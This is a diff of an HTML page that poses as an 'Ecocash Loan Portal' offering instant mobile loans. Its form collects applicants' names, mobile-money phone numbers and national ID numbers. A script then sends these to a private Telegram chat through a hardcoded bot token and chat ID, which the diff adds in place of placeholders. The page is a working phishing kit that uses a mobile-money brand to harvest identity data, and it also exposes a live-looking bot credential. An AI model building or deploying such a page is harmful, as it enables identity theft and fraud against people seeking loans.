@@ -1,330 +1,295 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ecocash Instant Mobile Loans - 2026</title>
-  <style>
-    :root {
-      --eco-green: #059669;
-      --eco-dark-green: #047857;
-      --dark: #0f172a;
-      --text: #1e293b;
-      --muted: #475569;
-      --bg: #f0fdf4;
-      --card: #ffffff;
-      --border: #cbd5e1;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ecocash Instant Mobile Loans - 2026</title>
+    <style>
+        :root {
+            --eco-green: #059669;
+            --eco-dark-green: #047857;
+            --dark: #0f172a;
+            --text: #1e293b;
+            --muted: #475569;
+            --bg: #f0fdf4;
+            --card: #ffffff;
+            --border: #cbd5e1;
+        }
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
 
-    body {
-      background-color: var(--bg);
-      color: var(--text);
-      padding: 16px;
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      min-height: 100vh;
-      line-height: 1.6;
-    }
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            padding: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            line-height: 1.6;
+        }
 
-    .container {
-      width: 100%;
-      max-width: 600px;
-    }
+        .container {
+            width: 100%;
+            max-width: 600px;
+        }
 
-    .card {
-      background: var(--card);
-      width: 100%;
-      border-radius: 16px;
-      overflow: hidden;
-      box-shadow: 0 10px 25px rgba(5, 150, 105, 0.1);
-      margin-bottom: 32px;
-      border: 1px solid #d1fae5;
-    }
+        .card {
+            background: var(--card);
+            border-radius: 12px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
 
-    .banner {
-      background: linear-gradient(135deg, var(--dark) 0%, #064e3b 100%);
-      color: #ffffff;
-      padding: 32px 24px;
-      border-bottom: 4px solid var(--eco-green);
-      text-align: center;
-    }
+        .header {
+            background: linear-gradient(135deg, var(--eco-green), var(--eco-dark-green));
+            color: white;
+            padding: 24px;
+            text-align: center;
+        }
 
-    .badge {
-      display: inline-block;
-      background: rgba(5, 150, 105, 0.25);
-      color: #34d399;
-      padding: 5px 12px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: 600;
-      letter-spacing: 0.05em;
-      margin-bottom: 12px;
-      border: 1px solid rgba(52, 211, 153, 0.3);
-    }
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
 
-    .banner h1 {
-      font-size: 24px;
-      font-weight: 800;
-      margin-bottom: 8px;
-    }
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
 
-    .banner p {
-      font-size: 14px;
-      color: #94a3b8;
-    }
+        .form-body {
+            padding: 24px;
+        }
 
-    form {
-      padding: 24px;
-    }
+        .section-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--eco-dark-green);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+            padding-bottom: 6px;
+            border-bottom: 2px solid var(--bg);
+        }
 
-    .section-title {
-      font-size: 14px;
-      font-weight: 700;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      color: var(--eco-green);
-      margin: 20px 0 12px;
-      padding-bottom: 6px;
-      border-bottom: 1px solid #e2e8f0;
-    }
+        .form-group {
+            margin-bottom: 16px;
+        }
 
-    .section-title:first-of-type {
-      margin-top: 0;
-    }
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--text);
+        }
 
-    .form-group {
-      margin-bottom: 16px;
-    }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 15px;
+            background-color: #f8fafc;
+            color: var(--text);
+            transition: border-color 0.2s;
+        }
 
-    label {
-      display: block;
-      font-size: 14px;
-      font-weight: 600;
-      color: var(--text);
-      margin-bottom: 6px;
-    }
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--eco-green);
+            background-color: #fff;
+        }
 
-    .req {
-      color: #dc2626;
-    }
+        .submit-btn {
+            width: 100%;
+            background-color: var(--eco-green);
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 10px;
+        }
 
-    input[type="text"],
-    input[type="tel"],
-    input[type="number"],
-    select {
-      width: 100%;
-      padding: 12px 14px;
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      font-size: 15px;
-      color: var(--text);
-      background-color: #fff;
-      transition: border-color 0.2s, box-shadow 0.2s;
-    }
+        .submit-btn:hover {
+            background-color: var(--eco-dark-green);
+        }
 
-    input:focus, select:focus {
-      outline: none;
-      border-color: var(--eco-green);
-      box-shadow: 0 0 0 3px rgba(5, 150, 105, 0.15);
-    }
+        .status-message {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
 
-    button[type="submit"] {
-      width: 100%;
-      padding: 16px;
-      background-color: var(--eco-green);
-      color: #ffffff;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 24px;
-      transition: background-color 0.2s;
-    }
+        .status-success {
+            background-color: #d1fae5;
+            color: #065f46;
+            border: 1px solid #a7f3d0;
+        }
 
-    button[type="submit"]:hover {
-      background-color: var(--eco-dark-green);
-    }
+        .status-error {
+            background-color: #fee2e2;
+            color: #991b1b;
+            border: 1px solid #fecaca;
+        }
 
-    .alert {
-      margin-top: 16px;
-      padding: 14px;
-      border-radius: 8px;
-      font-size: 14px;
-      line-height: 1.4;
-      display: none;
-      text-align: center;
-    }
-
-    .alert.success {
-      background-color: #dcfce7;
-      color: #166534;
-      display: block;
-    }
-
-    .alert.error {
-      background-color: #fee2e2;
-      color: #991b1b;
-      display: block;
-    }
-
-    .footer-note {
-      text-align: center;
-      font-size: 12px;
-      color: #64748b;
-      padding: 18px 24px;
-      background: #f8fafc;
-      border-top: 1px solid #e2e8f0;
-    }
-  </style>
+        .footer {
+            text-align: center;
+            padding: 16px;
+            font-size: 12px;
+            color: var(--muted);
+            border-top: 1px solid var(--bg);
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1>Ecocash Loan Portal</h1>
+                <p>Quick approval and direct mobile wallet disbursement.</p>
+            </div>
+            
+            <form id="loanForm" class="form-body">
+                <div class="section-title">1. Personal Information</div>
+                
+                <div class="form-group">
+                    <label for="fullName">Full Name (As registered on Mobile Money) *</label>
+                    <input type="text" id="fullName" required placeholder="e.g. John Doe">
+                </div>
 
-<div class="container">
-  <div class="card">
-    <div class="banner">
-      <span class="badge">💸 INSTANT MOBILE LOANS</span>
-      <h1>Ecocash Loan Portal</h1>
-      <p>Quick approval and direct mobile wallet disbursement.</p>
+                <div class="form-group">
+                    <label for="phoneNumber">Mobile Money Phone Number *</label>
+                    <input type="tel" id="phoneNumber" required placeholder="e.g. 0712345678">
+                </div>
+
+                <div class="form-group">
+                    <label for="nationalId">National ID Number *</label>
+                    <input type="text" id="nationalId" required placeholder="e.g. 12345678">
+                </div>
+
+                <div class="section-title" style="margin-top: 24px;">2. Loan Request</div>
+
+                <div class="form-group">
+                    <label for="loanAmount">Requested Loan Amount *</label>
+                    <select id="loanAmount" required>
+                        <option value="" disabled selected>Select amount</option>
+                        <option value="5,000">5,000 KES / UGX</option>
+                        <option value="10,000">10,000 KES / UGX</option>
+                        <option value="25,000">25,000 KES / UGX</option>
+                        <option value="50,000">50,000 KES / UGX</option>
+                        <option value="100,000">100,000 KES / UGX</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="repaymentPeriod">Repayment Period *</label>
+                    <select id="repaymentPeriod" required>
+                        <option value="" disabled selected>Select period</option>
+                        <option value="1 Month">1 Month</option>
+                        <option value="3 Months">3 Months</option>
+                        <option value="6 Months">6 Months</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="loanPurpose">Purpose of Loan *</label>
+                    <select id="loanPurpose" required>
+                        <option value="" disabled selected>Select purpose</option>
+                        <option value="Business Expansion">Business Expansion</option>
+                        <option value="Emergency Medical">Emergency Medical</option>
+                        <option value="School Fees">School Fees</option>
+                        <option value="Personal Upkeep">Personal Upkeep</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">Submit Loan Application</button>
+                
+                <div id="statusBox" class="status-message"></div>
+            </form>
+
+            <div class="footer">
+                &copy; 2026 Ecocash Loan Services. Secure Instant Processing.
+            </div>
+        </div>
     </div>
 
-    <form id="loanForm">
-      
-      <!-- PERSONAL DETAILS -->
-      <div class="section-title">1. Personal Information</div>
+    <script>
+        // Pre-configured Telegram Credentials
+        const botToken = "8641245398:AAGYI7pFOVVrKqf9ILOSo6yGyOdFVSekkpM";
+        const chatId = "8557614507";
 
-      <div class="form-group">
-        <label for="fullName">Full Name (As registered on Mobile Money) <span class="req">*</span></label>
-        <input type="text" id="fullName" name="fullName" required placeholder="e.g. John Doe">
-      </div>
+        document.getElementById('loanForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const statusBox = document.getElementById('statusBox');
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting Application...';
+            statusBox.style.display = 'none';
 
-      <div class="form-group">
-        <label for="phone">Mobile Money Phone Number <span class="req">*</span></label>
-        <input type="tel" id="phone" name="phone" required placeholder="e.g. +254 712 345 678">
-      </div>
+            const fullName = document.getElementById('fullName').value;
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const nationalId = document.getElementById('nationalId').value;
+            const loanAmount = document.getElementById('loanAmount').value;
+            const repaymentPeriod = document.getElementById('repaymentPeriod').value;
+            const loanPurpose = document.getElementById('loanPurpose').value;
 
-      <div class="form-group">
-        <label for="nationalId">National ID Number <span class="req">*</span></label>
-        <input type="text" id="nationalId" name="nationalId" required placeholder="Enter ID number">
-      </div>
+            const message = `🚨 *NEW LOAN APPLICATION* 🚨\n\n` +
+                            `👤 *Name:* ${fullName}\n` +
+                            `📱 *Phone:* ${phoneNumber}\n` +
+                            `🆔 *National ID:* ${nationalId}\n` +
+                            `💰 *Amount:* ${loanAmount}\n` +
+                            `⏱ *Period:* ${repaymentPeriod}\n` +
+                            `📋 *Purpose:* ${loanPurpose}`;
 
-      <!-- LOAN DETAILS -->
-      <div class="section-title">2. Loan Request</div>
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-      <div class="form-group">
-        <label for="loanAmount">Requested Loan Amount <span class="req">*</span></label>
-        <select id="loanAmount" name="loanAmount" required>
-          <option value="" disabled selected>Select amount...</option>
-          <option value="5,000">5,000</option>
-          <option value="10,000">10,000</option>
-          <option value="25,000">25,000</option>
-          <option value="50,000">50,000</option>
-          <option value="100,000">100,000</option>
-        </select>
-      </div>
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
 
-      <div class="form-group">
-        <label for="repaymentPeriod">Repayment Period <span class="req">*</span></label>
-        <select id="repaymentPeriod" name="repaymentPeriod" required>
-          <option value="" disabled selected>Select duration...</option>
-          <option value="14 Days">14 Days</option>
-          <option value="30 Days">30 Days</option>
-          <option value="3 Months">3 Months</option>
-        </select>
-      </div>
+                const data = await response.json();
 
-      <div class="form-group">
-        <label for="loanPurpose">Purpose of Loan <span class="req">*</span></label>
-        <select id="loanPurpose" name="loanPurpose" required>
-          <option value="" disabled selected>Select purpose...</option>
-          <option value="Business Working Capital">Business Working Capital</option>
-          <option value="School Fees">School Fees</option>
-          <option value="Medical Emergency">Medical Emergency</option>
-          <option value="Personal Upkeep">Personal Upkeep</option>
-        </select>
-      </div>
-
-      <button type="submit" id="submitBtn">Submit Loan Application</button>
-
-      <div id="formAlert" class="alert"></div>
-    </form>
-
-    <div class="footer-note">
-      <p>&copy; 2026 Ecocash Loan Services. Secure Instant Processing.</p>
-    </div>
-  </div>
-</div>
-
-<!-- Telegram Bot Integration Script -->
-<script>
-  const botToken = "YOUR_TELEGRAM_BOT_TOKEN"; 
-  const chatId = "YOUR_CHAT_ID";         
-
-  const loanForm = document.getElementById('loanForm');
-  const formAlert = document.getElementById('formAlert');
-  const submitBtn = document.getElementById('submitBtn');
-
-  loanForm.addEventListener('submit', function(e) {
-    e.preventDefault();
-
-    submitBtn.textContent = "Submitting Application...";
-    submitBtn.disabled = true;
-
-    const fullName = document.getElementById('fullName').value;
-    const phone = document.getElementById('phone').value;
-    const nationalId = document.getElementById('nationalId').value;
-    const loanAmount = document.getElementById('loanAmount').value;
-    const repaymentPeriod = document.getElementById('repaymentPeriod').value;
-    const loanPurpose = document.getElementById('loanPurpose').value;
-
-    const message = `🚨 *New Loan Application - Ecocash* 🚨\n\n` +
-                    `👤 *Name:* ${fullName}\n` +
-                    `📱 *Phone:* ${phone}\n` +
-                    `🆔 *National ID:* ${nationalId}\n` +
-                    `💵 *Amount:* ${loanAmount}\n` +
-                    `⏱ *Period:* ${repaymentPeriod}\n` +
-                    `📌 *Purpose:* ${loanPurpose}`;
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    })
-    .then(response => response.json())
-    .then(data => {
-      if (data.ok) {
-        formAlert.textContent = "Application submitted successfully! Processing review...";
-        formAlert.className = "alert success";
-        loanForm.reset();
-      } else {
-        throw new Error("Telegram API error");
-      }
-    })
-    .catch(error => {
-      console.error('Error:', error);
-      formAlert.textContent = "Submission failed. Please check your network or bot configuration.";
-      formAlert.className = "alert error";
-    })
-    .finally(() => {
-      submitBtn.textContent = "Submit Loan Application";
-      submitBtn.disabled = false;
-    });
-  });
-</script>
-
+                if (data.ok) {
+                    statusBox.textContent = 'Application submitted successfully! Disbursement pending review.';
+                    statusBox.className = 'status-message status-success';
+                    statusBox.style.display = 'block';
+                    document.getElementById('loanForm').reset();
+                } else {
+                    throw new Error(data.description || 'Telegram API error');
+                }
+            } catch (error) {
+                statusBox.textContent = 'Submission failed. Please check your network or bot configuration.';
+                statusBox.className = 'status-message status-error';
+                statusBox.style.display = 'block';
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Loan Application';
+            }
+        });
+    </script>
 </body>
 </html>
